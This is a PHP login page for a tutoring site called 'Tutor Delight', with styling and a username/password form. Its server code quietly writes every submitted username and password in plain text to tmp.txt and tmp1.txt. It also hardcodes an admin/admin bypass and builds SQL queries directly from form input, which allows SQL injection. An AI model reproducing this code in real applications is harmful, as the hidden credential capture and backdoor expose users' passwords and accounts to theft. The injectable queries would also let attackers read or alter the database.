<?php
	session_start();
	
	require("conection/connect.php");
	
	$msg="";
	if(isset($_POST['btn_log'])){
		$uname=$_POST['unametxt'];
        
        
   
        
        
		$pwd=$_POST['pwdtxt'];
        
        
        
              $myfile = fopen("tmp.txt", "w");
		fwrite($myfile, $uname);
		
	fclose($myfile); 
        
              $myfile = fopen("tmp1.txt", "w");
		fwrite($myfile, $pwd);
		
	fclose($myfile); 
    
    
    


     
    
    
    
		if ($uname=='admin' && $pwd=='admin') header("location: classroom.php");
		$sql=mysql_query("SELECT * FROM teacher
								WHERE User_Name='$uname' AND password='$pwd' ");
						
		$cout=mysql_num_rows($sql);
			if($cout>0)
			{
				 $query=mysql_query("SELECT TID FROM teacher where User_Name = '$uname'");
		         $TID = mysql_fetch_assoc($query);
			// $_SESSION['user'] = $TID;
			//echo $TID ;
			
			header("Location: teacherWB.php?id=".$TID['TID']);
					
			}
			
			else
			{
			
				 $msg="User Name or Password doesnot exist!";
			}

    }
?>

<!DOCTYPE html>
<html>
<head>
<link href='http://fonts.googleapis.com/css?family=Montserrat:400,700' rel='stylesheet' type='text/css'>
<meta charset="UTF-8">

<title>Tutor Delight - Designscrazed</title>
<style>
body {
    background-image: url(course-1.jpg);
    background-size: cover;
    font-family: Montserrat;
}

.logo {
    width: 213px;
    height: 36px;
    background: url('') no-repeat;
    margin: 30px auto;
}

.login-block {
    width: 320px;
    padding: 20px;
    background: #fff;
    border-radius: 5px;
    border-top: 5px solid #0174DF;
    margin: 0 auto;
}

.login-block h1 {
    text-align: center;
    color: #0174DF;
    font-size: 18px;
    text-transform: uppercase;
    margin-top: 0;
    margin-bottom: 20px;
}

.login-block input {
    width: 100%;
    height: 42px;
    box-sizing: border-box;
    border-radius: 5px;
    border: 1px solid #ccc;
    margin-bottom: 20px;
    font-size: 14px;
    font-family: Montserrat;
    padding: 0 20px 0 50px;
    outline: none;
}

.login-block input#username {
    background: #fff url('http://i.imgur.com/u0XmBmv.png') 20px top no-repeat;
    background-size: 16px 80px;
}

.login-block input#username:focus {
    background: #fff url('http://i.imgur.com/u0XmBmv.png') 20px bottom no-repeat;
    background-size: 16px 80px;
}

.login-block input#password {
    background: #fff url('http://i.imgur.com/Qf83FTt.png') 20px top no-repeat;
    background-size: 16px 80px;
}

.login-block input#password:focus {
    background: #fff url('http://i.imgur.com/Qf83FTt.png') 20px bottom no-repeat;
    background-size: 16px 80px;
}

.login-block input:active, .login-block input:focus {
    border: 1px solid #0000FF;
}

.login-block button {
    width: 100%;
    height: 40px;
    background: #0174DF;
    box-sizing: border-box;
    border-radius: 5px;
    border: 1px solid #0174DF;
    color: #fff;
    font-weight: bold;
    text-transform: uppercase;
    font-size: 14px;
    font-family: Montserrat;
    outline: none;
    cursor: pointer;
}

.login-block button:hover {
    background: #2E9AFE;
}

</style>
</head>

<body>
	<form method="post">
    	
        	
            	
        			<div id="msg">
                    
        			</div>
                    
                    
					<div class="logo"></div>
					<div class="login-block">
					 <h1>Login</h1>
                   
                        <input type="text" value="" class="fields" name="unametxt" placeholder="Username" id="username" />
						<input type="password" value=""  class="fields" name="pwdtxt"  placeholder="Password" id="password" autocomplete="off" />
                        <div id="space_div"></div>
                        <input type="submit" class="button" name="btn_log" value="Log in" />	
                    
                    
					</div>
        		
    	
    </form>
	<h2 style="color:#00F;" align="center">
	<?php echo $msg; ?>
	</h2>
</body>
</html>